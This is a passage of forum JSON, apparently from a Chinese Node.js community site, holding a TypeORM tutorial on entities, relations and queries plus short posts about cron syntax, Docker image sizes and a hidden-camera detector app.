{\n\n    @PrimaryGeneratedColumn()\n    id: number;\n\n    @Column()\n    name: string;\n\n    @Column()\n    description: string;\n\n    @Column()\n    filename: string;\n\n    @Column()\n    views: number;\n\n    @Column()\n    isPublished: boolean;\n}\n</code></pre><h3>列数据类型</h3>\n<p>接下来，让我们修复数据类型。默认情况下，字符串被映射到一个varchar(255)类型（取决于数据库类型）。\n数字被映射到一个integer类型（取决于数据库类型）。\n我们不希望所有的列都是有限的varchars或整数。\n让我们设置正确的数据类型：</p>\n<pre class=\"prettyprint language-typescript\"><code>import {Entity, Column, PrimaryGeneratedColumn} from &quot;typeorm&quot;;\n\n@Entity()\nexport class Photo {\n\n    @PrimaryGeneratedColumn()\n    id: number;\n\n    @Column({\n        length: 100\n    })\n    name: string;\n\n    @Column(&quot;text&quot;)\n    description: string;\n\n    @Column()\n    filename: string;\n\n    @Column(&quot;double&quot;)\n    views: number;\n\n    @Column()\n    isPublished: boolean;\n}\n</code></pre><p>列类型取决于数据库支持的类型。\n可以设置数据库支持的任何列类型。\n更多关于支持的列类型信息可以在这里找到<a href>这里</a>。</p>\n<h3>创建数据库连接</h3>\n<p>现在实体已经有了，让我们新建一个 <code>index.ts</code> （或 <code>app.ts</code> 不管你叫它什么）的文件，并配置数据库连接：</p>\n<pre class=\"prettyprint language-typescript\"><code>import &quot;reflect-metadata&quot;;\nimport {createConnection} from &quot;typeorm&quot;;\nimport {Photo} from &quot;.&#x2F;entity&#x2F;Photo&quot;;\n\ncreateConnection({\n    type: &quot;mysql&quot;,\n    host: &quot;localhost&quot;,\n    port: 3306,\n    username: &quot;root&quot;,\n    password: &quot;admin&quot;,\n    database: &quot;test&quot;,\n    entities: [\n        Photo\n    ],\n    synchronize: true,\n    logging: false\n}).then(connection =&gt; {\n    &#x2F;&#x2F; 这里可以写实体操作相关的代码 \n}).catch(error =&gt; console.log(error));\n</code></pre><p>在例子里使用的是mysql，你也可以选择其他数据库，只需要简单修改driver选项里的数据库的类型就可以了，比如：\nmysql, mariadb, postgres, sqlite, mssql or oracle.\n同样可以修改host, port, username, password 以及database等设置.</p>\n<p>把Photo实体加到数据连接的实体列表中，所有需要在这个连接下使用的实体都必须加到这个列表中。</p>\n<p><code>synchronize</code>选项可以在应用启动时确保你的实体和数据库保持同步。</p>\n<h3>引用目录下的所有实体</h3>\n<p>接下来我们可能会创建更多的实体并把它们一一加到配置当中。\n不过这样会比较麻烦，好在可以直接写上实体的目录，这样这个目录下的所有实体都可以在当前连接中被使用：</p>\n<pre class=\"prettyprint language-typescript\"><code>import {createConnection} from &quot;typeorm&quot;;\n\ncreateConnection({\n    driver: {\n        type: &quot;mysql&quot;,\n        host: &quot;localhost&quot;,\n        port: 3306,\n        username: &quot;root&quot;,\n        password: &quot;admin&quot;,\n        database: &quot;test&quot;\n    },\n    entities: [\n        __dirname + &quot;&#x2F;entity&#x2F;*.js&quot;\n    ],\n    synchronize: true,\n}).then(connection =&gt; {\n    &#x2F;&#x2F; here you can start to work with your entities\n}).catch(error =&gt; console.log(error));\n</code></pre><h3>启动应用</h3>\n<p>现在可以启动<code>app.ts</code>，启动后可以发现数据库自动被初始化，并且Photo这个表也会创建出来。</p>\n<pre class=\"prettyprint language-shell\"><code>+-------------+--------------+----------------------------+\n|                         photo                           |\n+-------------+--------------+----------------------------+\n| id          | int(11)      | PRIMARY KEY AUTO_INCREMENT |\n| name        | varchar(500) |                            |\n| description | text         |                            |\n| filename    | varchar(255) |                            |\n| views       | int(11)      |                            |\n| isPublished | boolean      |                            |\n+-------------+--------------+----------------------------+\n</code></pre><h3>添加和插入photo</h3>\n<p>现在创建一个新的photo然后存到数据库：</p>\n<pre class=\"prettyprint language-typescript\"><code>import {createConnection} from &quot;typeorm&quot;;\n\ncreateConnection(&#x2F;*...*&#x2F;).then(connection =&gt; {\n\n    let photo = new Photo();\n    photo.name = &quot;Me and Bears&quot;;\n    photo.description = &quot;I am near polar bears&quot;;\n    photo.filename = &quot;photo-with-bears.jpg&quot;;\n    photo.views = 1;\n    photo.isPublished = true;\n\n    connection.manager\n            .save(photo)\n            .then(photo =&gt; {\n                console.log(&quot;Photo has been saved&quot;);\n            });\n\n}).catch(error =&gt; console.log(error));\n</code></pre><h3>使用async/await语法</h3>\n<p>现在利用TypeScript的async/await语法来实现同样的功能：</p>\n<pre class=\"prettyprint language-typescript\"><code>import {createConnection} from &quot;typeorm&quot;;\nimport {Photo} from &quot;.&#x2F;entity&#x2F;Photo&quot;;\n\ncreateConnection(&#x2F;*...*&#x2F;).then(async connection =&gt; {\n\n    let photo = new Photo();\n    photo.name = &quot;Me and Bears&quot;;\n    photo.description = &quot;I am near polar bears&quot;;\n    photo.filename = &quot;photo-with-bears.jpg&quot;;\n    photo.views = 1;\n    photo.isPublished = true;\n\n    await connection.manager.save(photo);\n    console.log(&quot;Photo has been saved&quot;);\n\n}).catch(error =&gt; console.log(error));\n</code></pre><h3>使用EntityManager</h3>\n<p>刚刚我们创建了一个新的photo并且存进数据库。使用EntityManager可以操作实体，现在用<code>EntityManager</code>来把photo从数据库中取出来。</p>\n<pre class=\"prettyprint language-typescript\"><code>import {createConnection} from &quot;typeorm&quot;;\nimport {Photo} from &quot;.&#x2F;entity&#x2F;Photo&quot;;\n\ncreateConnection(&#x2F;*...*&#x2F;).then(async connection =&gt; {\n\n    &#x2F;*...*&#x2F;\n    let savedPhotos = await connection.manager.find(Photo);\n    console.log(&quot;All photos from the db: &quot;, savedPhotos);\n\n}).catch(error =&gt; console.log(error));\n</code></pre><p>savedPhotos 会从数据库中取到的是一个Photo对象的数组</p>\n<h3>使用Repositories</h3>\n<p>现在重构下代码，使用<code>Repository</code>来代替EntityManage。每个实体都有自己的repository，可以对这个实体进行任何操作。\n如果要对实体做很多操作，Repositories会比EntityManager更加方便。</p>\n<pre class=\"prettyprint language-typescript\"><code>import {createConnection} from &quot;typeorm&quot;;\nimport {Photo} from &quot;.&#x2F;entity&#x2F;Photo&quot;;\n\ncreateConnection(&#x2F;*...*&#x2F;).then(async connection =&gt; {\n\n    let photo = new Photo();\n    photo.name = &quot;Me and Bears&quot;;\n    photo.description = &quot;I am near polar bears&quot;;\n    photo.filename = &quot;photo-with-bears.jpg&quot;;\n    photo.views = 1;\n    photo.isPublished = true;\n\n    let photoRepository = connection.getRepository(Photo);\n\n    await photoRepository.save(photo);\n    console.log(&quot;Photo has been saved&quot;);\n\n    let savedPhotos = await photoRepository.find();\n    console.log(&quot;All photos from the db: &quot;, savedPhotos);\n\n}).catch(error =&gt; console.log(error));\n</code></pre><h3>从数据库中取photos</h3>\n<p>现在来尝试用Repository做一些取数据方面的操作:</p>\n<pre class=\"prettyprint language-typescript\"><code>import {createConnection} from &quot;typeorm&quot;;\nimport {Photo} from &quot;.&#x2F;entity&#x2F;Photo&quot;;\n\ncreateConnection(&#x2F;*...*&#x2F;).then(async connection =&gt; {\n\n    &#x2F;*...*&#x2F;\n    let allPhotos = await photoRepository.find();\n    console.log(&quot;All photos from the db: &quot;, allPhotos);\n\n    let firstPhoto = await photoRepository.findOneById(1);\n    console.log(&quot;First photo from the db: &quot;, firstPhoto);\n\n    let meAndBearsPhoto = await photoRepository.findOne({ name: &quot;Me and Bears&quot; });\n    console.log(&quot;Me and Bears photo from the db: &quot;, meAndBearsPhoto);\n\n    let allViewedPhotos = await photoRepository.find({ views: 1 });\n    console.log(&quot;All viewed photos: &quot;, allViewedPhotos);\n\n    let allPublishedPhotos = await photoRepository.find({ isPublished: true });\n    console.log(&quot;All published photos: &quot;, allPublishedPhotos);\n\n    let [allPhotos, photosCount] = await photoRepository.findAndCount();\n    console.log(&quot;All photos: &quot;, allPublishedPhotos);\n    console.log(&quot;Photos count: &quot;, allPublishedPhotos);\n\n}).catch(error =&gt; console.log(error));\n</code></pre><h3>更新photo</h3>\n<p>现在来从数据库中取出一个photo，修改并更新到数据库。</p>\n<pre class=\"prettyprint language-typescript\"><code>import {createConnection} from &quot;typeorm&quot;;\nimport {Photo} from &quot;.&#x2F;entity&#x2F;Photo&quot;;\n\ncreateConnection(&#x2F;*...*&#x2F;).then(async connection =&gt; {\n\n    &#x2F;*...*&#x2F;\n    let photoToUpdate = await photoRepository.findOneById(1);\n    photoToUpdate.name = &quot;Me, my friends and polar bears&quot;;\n    await photoRepository.save(photoToUpdate);\n\n}).catch(error =&gt; console.log(error));\n</code></pre><p>这个<code>id = 1</code>的photo在数据库中就成功更新了.</p>\n<h3>删除photo</h3>\n<p>再来，从数据库中删除我们的photo:</p>\n<pre class=\"prettyprint language-typescript\"><code>import {createConnection} from &quot;typeorm&quot;;\nimport {Photo} from &quot;.&#x2F;entity&#x2F;Photo&quot;;\n\ncreateConnection(&#x2F;*...*&#x2F;).then(async connection =&gt; {\n\n    &#x2F;*...*&#x2F;\n    let photoToRemove = await photoRepository.findOneById(1);\n    await photoRepository.remove(photoToRemove);\n\n}).catch(error =&gt; console.log(error));\n</code></pre><p>这个<code>id = 1</code>的photo就在数据库中被移除了。</p>\n<h3>一对一关系</h3>\n<p>来创建与另一个类的一对一关系。\n新建PhotoMetadata.ts用来存photo的元信息。</p>\n<pre class=\"prettyprint language-typescript\"><code>import {Entity, Column, PrimaryGeneratedColumn, OneToOne, JoinColumn} from &quot;typeorm&quot;;\nimport {Photo} from &quot;.&#x2F;Photo&quot;;\n\n@Entity()\nexport class PhotoMetadata {\n\n    @PrimaryGeneratedColumn()\n    id: number;\n\n    @Column(&quot;int&quot;)\n    height: number;\n\n    @Column(&quot;int&quot;)\n    width: number;\n\n    @Column()\n    orientation: string;\n\n    @Column()\n    compressed: boolean;\n\n    @Column()\n    comment: string;\n\n    @OneToOne(type =&gt; Photo)\n    @JoinColumn()\n    photo: Photo;\n}\n</code></pre><p>这里我们用到了一个新的装饰器<code>@OneToOne</code>，它可以用来在两个实体之间创建一对一关系。\n<code>type =&gt; Photo</code>指示了我们想要连接的实体类名，这里因为TypeScript语言的支持原因不能直接用类名。\n当然也可以使用<code>() =&gt; Photo</code>，但是<code>type =&gt; Photo</code>显得更有可读性。\nType变量本身并不包含任何东西。</p>\n<p>我们同样使用了<code>@JoinColumn</code>装饰器，这个装饰器可以指定一对一关系的拥有者。\n关系可以是单向的或双向的，但是只有一方是拥有者，加个这个装饰器就表示关系是给这个表服务的。</p>\n<p>现在运行app，会新创建一个table，这个table有一个连接photo的外键：</p>\n<pre class=\"prettyprint language-shell\"><code>+-------------+--------------+----------------------------+\n|                      photo &#96;译者注：应该是PhotoMetadata&#96; |\n+-------------+--------------+----------------------------+\n| id          | int(11)      | PRIMARY KEY AUTO_INCREMENT |\n| height      | int(11)      |                            |\n| width       | int(11)      |                            |\n| comment     | varchar(255) |                            |\n| compressed  | boolean      |                            |\n| orientation | varchar(255) |                            |\n| photo       | int(11)      | FOREIGN KEY                |\n+-------------+--------------+----------------------------+\n</code></pre><h3>存一个有一对一关系的对象</h3>\n<p>现在来创建一个photo，一个photo的元信息，并把它们已经连接起来。</p>\n<pre class=\"prettyprint language-typescript\"><code>import {createConnection} from &quot;typeorm&quot;;\nimport {Photo} from &quot;.&#x2F;entity&#x2F;Photo&quot;;\nimport {PhotoMetadata} from &quot;.&#x2F;entity&#x2F;PhotoMetadata&quot;;\n\ncreateConnection(&#x2F;*...*&#x2F;).then(async connection =&gt; {\n\n    &#x2F;&#x2F; 创建一个photo\n    let photo = new Photo();\n    photo.name = &quot;Me and Bears&quot;;\n    photo.description = &quot;I am near polar bears&quot;;\n    photo.filename = &quot;photo-with-bears.jpg&quot;\n    photo.isPublished = true;\n\n    &#x2F;&#x2F; 创建一个photo的元信息\n    let  metadata = new PhotoMetadata();\n    metadata.height = 640;\n    metadata.width = 480;\n    metadata.compressed = true;\n    metadata.comment = &quot;cybershoot&quot;;\n    metadata.orientation = &quot;portait&quot;;\n    metadata.photo = photo; &#x2F;&#x2F; 这里把两者连起来\n\n    &#x2F;&#x2F; 获取实体repositories\n    let photoRepository = connection.getRepository(Photo);\n    let metadataRepository = connection.getRepository(PhotoMetadata);\n\n    &#x2F;&#x2F; 先来把photo存到数据库\n    await photoRepository.save(photo);\n\n    &#x2F;&#x2F; photo存完了，再存下photo的元信息\n    await metadataRepository.save(metadata);\n\n    &#x2F;&#x2F; 搞定\n    console.log(&quot;metadata is saved, and relation between metadata and photo is created in the database too&quot;);\n\n}).catch(error =&gt; console.log(error));\n</code></pre><h3>双向关系</h3>\n<p>关系可以是单向的或是双向的.\n现在PhotoMetadata和Photo的关系是单向的，关系拥有者是PhotoMetadata，Photo并不知道PhotoMetadata，这样如果要想从Photo里得到PhotoMetadata的数据会比较麻烦。\n现在来改变一下，把单向改成双向：</p>\n<pre class=\"prettyprint language-typescript\"><code>import {Entity, Column, PrimaryGeneratedColumn, OneToOne, JoinColumn} from &quot;typeorm&quot;;\nimport {Photo} from &quot;.&#x2F;Photo&quot;;\n\n@Entity()\nexport class PhotoMetadata {\n\n    &#x2F;* ... 其他列 *&#x2F;\n\n    @OneToOne(type =&gt; Photo, photo =&gt; photo.metadata)\n    @JoinColumn()\n    photo: Photo;\n}\n</code></pre><pre class=\"prettyprint language-typescript\"><code>import {Entity, Column, PrimaryGeneratedColumn, OneToOne} from &quot;typeorm&quot;;\nimport {PhotoMetadata} from &quot;.&#x2F;PhotoMetadata&quot;;\n\n@Entity()\nexport class Photo {\n\n    &#x2F;* ... 其他列 *&#x2F;\n\n    @OneToOne(type =&gt; PhotoMetadata, photoMetadata =&gt; photoMetadata.photo)\n    metadata: PhotoMetadata;\n}\n</code></pre><p><code>photo =&gt; photo.metadata</code> 是用来指定反向关系的字段名字，photo.metadata就指出了Photo里的metadata字段名字。\n当然也可以使用<code>@OneToOne('metadata')</code>来达到同样的目的，不过这种对于以后的代码重构不友好。</p>\n<p>按上面说的，<code>@JoinColumn</code>只能在关系的一边使用来使这边做为关系的拥有者，关系拥有者在数据库里的表现就是拥有一个外键列。</p>\n<h3>取出关系对象的数据</h3>\n<p>现在来用一个查询来取出photo以及它的元信息。\n有两种方式，一是用<code>FindOptions</code>，另一个是使用<code>QueryBuilder</code>。\n先试下<code>FindOptions</code>，通过指定<code>FindOptions</code>接口作为参数来使用<code>Repository.find</code>方法可以完成非常复杂的查询。</p>\n<pre class=\"prettyprint language-typescript\"><code>import {createConnection} from &quot;typeorm&quot;;\nimport {Photo} from &quot;.&#x2F;entity&#x2F;Photo&quot;;\nimport {PhotoMetadata} from &quot;.&#x2F;entity&#x2F;PhotoMetadata&quot;;\n\ncreateConnection(&#x2F;*...*&#x2F;).then(async connection =&gt; {\n\n    &#x2F;*...*&#x2F;\n    let photoRepository = connection.getRepository(Photo);\n    let photos = await photoRepository.find({\n        alias: &quot;photo&quot;,\n        innerJoinAndSelect: {\n            &quot;metadata&quot;: &quot;photo.metadata&quot;\n        }\n    });\n\n\n}).catch(error =&gt; console.log(error));\n</code></pre><p>返回的photos是从数据库里取回的photo的数组，每个photo都包含它的元信息。</p>\n<p><code>alias</code> 是FindOptions的一个必需选项，这是你自己在select里定义的别名，然后需要用在接下来的 where, order by, group by, join 以及其他表达式.</p>\n<p>这里还用到了<code>innerJoinAndSelect</code>，表示内联查询photo.metadata的数据。\n<code>&quot;photo.metadata&quot;</code>里&quot;photo&quot;是一个别名，&quot;metadata&quot;则是你想查询的那个对象的属性名。\n<code>&quot;metadata&quot;</code>: 是内联返回数据的新的别名.</p>\n<p>下面来尝试第二种方式：<code>QueryBuilder</code>来达到同样的目的. 使用<code>QueryBuilder</code>可以优雅完成复杂的查询:</p>\n<pre class=\"prettyprint language-typescript\"><code>import {createConnection} from &quot;typeorm&quot;;\nimport {Photo} from &quot;.&#x2F;entity&#x2F;Photo&quot;;\nimport {PhotoMetadata} from &quot;.&#x2F;entity&#x2F;PhotoMetadata&quot;;\n\ncreateConnection(&#x2F;*...*&#x2F;).then(async connection =&gt; {\n\n    &#x2F;*...*&#x2F;\n    let photoRepository = connection.getRepository(Photo);\n    let photos = await photoRepository.createQueryBuilder(&quot;photo&quot;)\n            .innerJoinAndSelect(&quot;photo.metadata&quot;, &quot;metadata&quot;)\n            .getMany();\n\n\n}).catch(error =&gt; console.log(error));\n</code></pre><h3>使用 cascade 选项来自动保存关系着的对象</h3>\n<p>上面要保存关系对象需要一个一个来保存，略显麻烦。\n如果我们需要当关系对象中的一个被保存后，另一个也同样被保存，则可以使用<code>cascade</code>选项来做到。\n稍微改下<code>@OneToOne</code>装饰:</p>\n<pre class=\"prettyprint language-typescript\"><code>export class Photo {\n    &#x2F;&#x2F;&#x2F; ... 其他列\n\n    @OneToOne(type =&gt; PhotoMetadata, metadata =&gt; metadata.photo, {\n        cascadeInsert: true,\n        cascadeUpdate: true,\n        cascadeRemove: true\n    })\n    metadata: PhotoMetadata;\n}\n</code></pre><ul>\n<li><strong>cascadeInsert</strong> - 如果表中没有关系中的metadata，则自动insert，即我们不需要再手动insert一个新的photoMetadata对象。</li>\n<li><strong>cascadeUpdate</strong> - 如果metadata有变化，则自动update。</li>\n<li><strong>cascadeRemove</strong> - 如果把photo里的metadata移除了，也就是为空，则会自动remove表中的这条metadata数据。</li>\n</ul>\n<p>使用cascadeInsert就可以不需要像上面那边先存photo再存metadata了。\n现在我们来单单存photo对象，由于cascade的作用，metadata也会自动存上。</p>\n<pre class=\"prettyprint language-typescript\"><code>createConnection(options).then(async connection =&gt; {\n\n    &#x2F;&#x2F; 创建photo对象\n    let photo = new Photo();\n    photo.name = &quot;Me and Bears&quot;;\n    photo.description = &quot;I am near polar bears&quot;;\n    photo.filename = &quot;photo-with-bears.jpg&quot;\n    photo.isPublished = true;\n\n    &#x2F;&#x2F; 创建photo metadata 对象\n    let metadata = new PhotoMetadata();\n    metadata.height = 640;\n    metadata.width = 480;\n    metadata.compressed = true;\n    metadata.comment = &quot;cybershoot&quot;;\n    metadata.orientation = &quot;portait&quot;;\n    \n    photo.metadata = metadata; &#x2F;&#x2F; 连接起来\n\n    &#x2F;&#x2F; 得到repository\n    let photoRepository = connection.getRepository(Photo);\n\n    &#x2F;&#x2F; 存photo\n    await photoRepository.save(photo);\n    &#x2F;&#x2F; photo metadata也自动存上了\n    console.log(&quot;Photo is saved, photo metadata is saved too.&quot;)\n\n}).catch(error =&gt; console.log(error));\n</code></pre><h3>多对一/一对多关系</h3>\n<p>接下来显示多对一/一对多关系。\n假设一个photo会有一个author，并且每个author可以有很多photo。\n先创建Author实体：</p>\n<pre class=\"prettyprint language-typescript\"><code>import {Entity, Column, PrimaryGeneratedColumn, OneToMany, JoinColumn} from &quot;typeorm&quot;;\nimport {Photo} from &quot;.&#x2F;Photo&quot;;\n\n@Entity()\nexport class Author {\n\n    @PrimaryGeneratedColumn()\n    id: number;\n\n    @Column()\n    name: string;\n\n    @OneToMany(type =&gt; Photo, photo =&gt; photo.author) &#x2F;&#x2F; 备注：下面会为Photo创建author属性\n    photos: Photo[];\n}\n</code></pre><p>Author包含一个反向的关系，<code>OneToMany</code>总是反向的，并且总是与<code>ManyToOne</code>成对出现。</p>\n<p>现在来为Photo加上关系拥有者。</p>\n<pre class=\"prettyprint language-typescript\"><code>import {Entity, Column, PrimaryGeneratedColumn, ManyToOne} from &quot;typeorm&quot;;\nimport {PhotoMetadata} from &quot;.&#x2F;PhotoMetadata&quot;;\nimport {Author} from &quot;.&#x2F;Author&quot;;\n\n@Entity()\nexport class Photo {\n\n    &#x2F;* ... 其他列 *&#x2F;\n\n    @ManyToOne(type =&gt; Author, author =&gt; author.photos)\n    author: Author;\n}\n</code></pre><p>在<code>ManyToOne/OneToMany</code>关系中，拥有者一边总是<code>ManyToOne</code>。<code>译者注：拥有外键者即关系拥有者</code>\n也就是<code>ManyToOne</code>的那个字段存的是另一个对象的id。<code>译者注：也就是上面的author虽然属性是Author，但在数据库中类型是Author id的类型，存的也是id</code></p>\n<p>执行上面的代码将会自动创建author表，如下:</p>\n<pre class=\"prettyprint language-shell\"><code>+-------------+--------------+----------------------------+\n|                          author                         |\n+-------------+--------------+----------------------------+\n| id          | int(11)      | PRIMARY KEY AUTO_INCREMENT |\n| name        | varchar(255) |                            |\n+-------------+--------------+----------------------------+\n</code></pre><p>因为photo表已经存在，所以不是增加而是修改photo表 - 添加一个新外键列author:</p>\n<pre class=\"prettyprint language-shell\"><code>+-------------+--------------+----------------------------+\n|                         photo                           |\n+-------------+--------------+----------------------------+\n| id          | int(11)      | PRIMARY KEY AUTO_INCREMENT |\n| name        | varchar(255) |                            |\n| description | varchar(255) |                            |\n| filename    | varchar(255) |                            |\n| isPublished | boolean      |                            |\n| author      | int(11)      | FOREIGN KEY                |\n+-------------+--------------+----------------------------+\n</code></pre><h3>多对多关系</h3>\n<p>假设photo可以存在多个相册中，并且相册里可以包含多个photo。\n先创建一个<code>Album</code>类</p>\n<pre class=\"prettyprint language-typescript\"><code>import {Entity, PrimaryGeneratedColumn, Column, ManyToMany, JoinTable} from &quot;typeorm&quot;;\n\n@Entity()\nexport class Album {\n\n    @PrimaryGeneratedColumn()\n    id: number;\n\n    @Column()\n    name: string;\n\n    @ManyToMany(type =&gt; Photo, photo =&gt; photo.albums, {  &#x2F;&#x2F; 备注: 会在下面的Photo类里添加&quot;albums&quot;属性\n        cascadeInsert: true, &#x2F;&#x2F; 在添加Album时，会自动添加相册里的Photo\n        cascadeUpdate: true, &#x2F;&#x2F; 在更新Album时，会自动更新相册里的Photo \n        cascadeRemove: true  &#x2F;&#x2F; 在移除Album时，会自动移除相册里的Photo\n    })\n    @JoinTable()\n    photos: Photo[];\n}\n</code></pre><p><code>@JoinTable</code>多对多关系拥有者必须指定的。</p>\n<p>接着给<code>Photo</code>实体加个反向关系:</p>\n<pre class=\"prettyprint language-typescript\"><code>export class Photo {\n    &#x2F;&#x2F;&#x2F; ... 其他列\n\n    @ManyToMany(type =&gt; Album, album =&gt; album.photos, {\n        cascadeInsert: true, &#x2F;&#x2F; 在添加Album时，会自动添加相册里的Photo\n        cascadeUpdate: true, &#x2F;&#x2F; 在更新Album时，会自动更新相册里的Photo \n        cascadeRemove: true  &#x2F;&#x2F; 在移除Album时，会自动移除相册里的Photo\n    })\n    albums: Album[];\n}\n</code></pre><p>执行上面的代码后会自动创建一个叫 <strong>album_photos_photo_albums</strong>的<em>联接表</em>:</p>\n<pre class=\"prettyprint language-shell\"><code>+-------------+--------------+----------------------------+\n|                album_photos_photo_albums                |\n+-------------+--------------+----------------------------+\n| album_id_1  | int(11)      | PRIMARY KEY FOREIGN KEY    |\n| photo_id_2  | int(11)      | PRIMARY KEY FOREIGN KEY    |\n+-------------+--------------+----------------------------+\n</code></pre><p>记得把<code>Album</code>实体加到ConnectionOptions中:</p>\n<pre class=\"prettyprint language-typescript\"><code>const options: CreateConnectionOptions = {\n    &#x2F;&#x2F; ... 其他配置\n    entities: [Photo, PhotoMetadata, Author, Album]\n};\n</code></pre><p>现在来往数据库里插入albums和photos</p>\n<pre class=\"prettyprint language-typescript\"><code>let connection = await createConnection(options);\n\n&#x2F;&#x2F; 创建两个albums\nlet album1 = new Album();\nalbum1.name = &quot;Bears&quot;;\n\nlet album2 = new Album();\nalbum2.name = &quot;Me&quot;;\n\n&#x2F;&#x2F; 创建两个photos\nlet photo1 = new Photo();\nphoto1.name = &quot;Me and Bears&quot;;\nphoto1.description = &quot;I am near polar bears&quot;;\nphoto1.filename = &quot;photo-with-bears.jpg&quot;;\nphoto1.albums = [album1];\n\nlet photo2 = new Photo();\nphoto2.name = &quot;Me and Bears&quot;;\nphoto2.description = &quot;I am near polar bears&quot;;\nphoto2.filename = &quot;photo-with-bears.jpg&quot;;\nphoto2.albums = [album2];\n\n&#x2F;&#x2F; 获取Photo的repository\nlet photoRepository = connection.getRepository(Photo);\n\n&#x2F;&#x2F; 依次存储photos，由于cascade，albums也同样会自动存起来\nawait photoRepository.save(photo1);\nawait photoRepository.save(photo2);\n\nconsole.log(&quot;Both photos have been saved&quot;);\n</code></pre><h3>使用QueryBuilder</h3>\n<p>可以利用QueryBuilder来构建一个非常复杂的查询，例如：</p>\n<pre class=\"prettyprint language-typescript\"><code>let photoRepository = connection.getRepository(Photo);\nlet photos = await photoRepository\n    .createQueryBuilder(&quot;photo&quot;) &#x2F;&#x2F; 别名，必填项，用来指定本次查询\n    .innerJoinAndSelect(&quot;photo.metadata&quot;, &quot;metadata&quot;)\n    .leftJoinAndSelect(&quot;photo.albums&quot;, &quot;albums&quot;)\n    .where(&quot;photo.isPublished=true&quot;)\n    .andWhere(&quot;(photo.name=:photoName OR photo.name=:bearName)&quot;)\n    .orderBy(&quot;photo.id&quot;, &quot;DESC&quot;)\n    .skip(5)\n    .take(10)\n    .setParameters({ photoName: &quot;My&quot;, bearName: &quot;Mishka&quot; })\n    .getMany();\n</code></pre><p>这个查询会查找已经published的，并且name是&quot;My&quot;或&quot;Mishka&quot;，\n得到的结果会从第5个开始（分页偏移决定的），\n并且只会得到10个结果（分页每页个数决定的），\n所得结果是以id的倒序排序的，\nPhoto的albums是左联接，photo的metadata是内联接。</p>\n<p>你将在应用程序中大量使用QueryBuilder。\n了解更多QueryBuilder<a href>这里</a>.</p>\n<h2>样例</h2>\n<p>看看<a href=\"https://github.com/typeorm/typeorm/tree/master/sample\">样例</a>里这些例子的用法</p>\n<p>这些仓库，你可以克隆下来帮助你开始:</p>\n<ul>\n<li><a href=\"https://github.com/typeorm/typescript-example\">Example how to use TypeORM with TypeScript</a></li>\n<li><a href=\"https://github.com/typeorm/javascript-example\">Example how to use TypeORM with JavaScript</a></li>\n<li><a href=\"https://github.com/typeorm/babel-example\">Example how to use TypeORM with JavaScript and Babel</a></li>\n<li><a href=\"https://github.com/typeorm/browser-example\">Example how to use TypeORM with TypeScript and SystemJS in Browser</a></li>\n<li><a href=\"https://github.com/typeorm/typescript-express-example\">Example how to use Express and TypeORM</a></li>\n<li><a href=\"https://github.com/typeorm/typescript-koa-example\">Example how to use Koa and TypeORM</a></li>\n<li><a href=\"https://github.com/typeorm/typeorm-typescript-mongo-example\">Example how to use TypeORM with MongoDB</a></li>\n<li><a href=\"https://github.com/typeorm/cordova-example\">Example how to use TypeORM in a Cordova/PhoneGap app</a></li>\n<li><a href=\"https://github.com/typeorm/ionic-example\">Example how to use TypeORM with an Ionic app</a></li>\n</ul>\n<h2>扩展</h2>\n<p>这几个扩展可以简化TypeORM的使用，并将其与其他模块集成：</p>\n<ul>\n<li><a href=\"https://github.com/typeorm/typeorm-typedi-extensions\">TypeORM integration</a> with <a href=\"https://github.com/pleerock/typedi\">TypeDI</a></li>\n<li><a href=\"https://github.com/typeorm/typeorm-routing-controllers-extensions\">TypeORM integration</a> with <a href=\"https://github.com/pleerock/routing-controllers\">routing-controllers</a></li>\n<li>Models generation from existing database - <a href=\"https://github.com/Kononnable/typeorm-model-generator\">typeorm-model-generator</a></li>\n</ul>\n</div>","title":"TypeORM - 最好的Node.js ORM框架","last_reply_at":"2019-01-18T08:26:56.972Z","good":false,"top":false,"reply_count":37,"visit_count":7994,"create_at":"2018-04-01T05:52:56.794Z","author":{"loginname":"huanz","avatar_url":"https://avatars1.githubusercontent.com/u/5865669?v=4&s=120"}},{"id":"5c34c1a73898674067a7cc73","author_id":"56fdcb26c5f5b4a959e91751","tab":"ask","content":"<div class=\"markdown-text\"><p>如题，\n一般写法  每隔1分钟执行一次：0 */1 * * * ?</p>\n<p>一般每隔90秒怎么写呢，好像实现不了</p>\n</div>","title":"请教下各位，定时任务 每90秒怎么写  cron写法","last_reply_at":"2019-01-18T04:58:07.753Z","good":false,"top":false,"reply_count":10,"visit_count":1373,"create_at":"2019-01-08T15:28:39.115Z","author":{"loginname":"cllgeek","avatar_url":"https://avatars0.githubusercontent.com/u/15187909?v=4&s=120"}},{"id":"5c3f21bfa4d44449266b1c18","author_id":"5ad86092a7d228c16b987042","tab":"ask","content":"<div class=\"markdown-text\"><p>一个node服务端的项目使用docker部署的时候，docker image的大小多少是正常的？\n目前有两种：\n1、基于node:alpine的镜像，大小200M左右\n2、基于node:8.12.0的镜像，大小800M左右\n还有就是有python环境的Node的基础镜像吗？求推荐</p>\n</div>","title":"node docker image大小","last_reply_at":"2019-01-18T04:31:15.513Z","good":false,"top":false,"reply_count":4,"visit_count":701,"create_at":"2019-01-16T12:21:19.104Z","author":{"loginname":"dingyuanwu","avatar_url":"https://avatars0.githubusercontent.com/u/27721756?v=4&s=120"}},{"id":"5c4141bb3898674067a8066e","author_id":"5c10c50f7ec239239ff561c2","tab":"share","content":"<div class=\"markdown-text\"><p>找到一个很有趣的限免 app：“Spy hidden camera Detector”（￥25）\n他是根据一些很受欢迎的 “寻找隐藏摄像头指南” 做成的一个应用，大概原理就是通过打开和关闭闪光灯来探测微小的反射迹象来检测~</p>\n<p>这个 app 也许在陌生地方过夜时可以用得着~\n这里可以下载：<a href=\"https://mergeek.com/free/apps?id=3DkYlemeyzmd9VPJ&amp;ref=cnode\">Mergeek 限免：Spy hidden camera Detector</a></p>\n<p><img src=\"//static.cnodejs.org/FkHOLp7HCcFRJNkG_gBxIQGjOg9O\" alt=\"392x696bb.jpg\"></p>\n</div>","title":"分享一个帮你找到隐藏摄像头的 app","last_reply_at":"2019-01-18T03:02:19.418Z","good":false,"top":false,"reply_count":0,"visit_count":901,"create_at":"2019-01-18T03:02:19.418Z","author":{"loginname":"Kilen","avatar_url":"https://avatars1.githubusercontent.com/u/2741628?v=4&s=120"}},{"id":"5c41319ea4d44449266b232b","author_id":"5c1c411f76c4964062a1c0e3","tab":"share","content":"<div class=\"markdown-text\"><p>为了便于大家对于网站的定位和理解，开发了一个评价的功能</p>\n<p><a 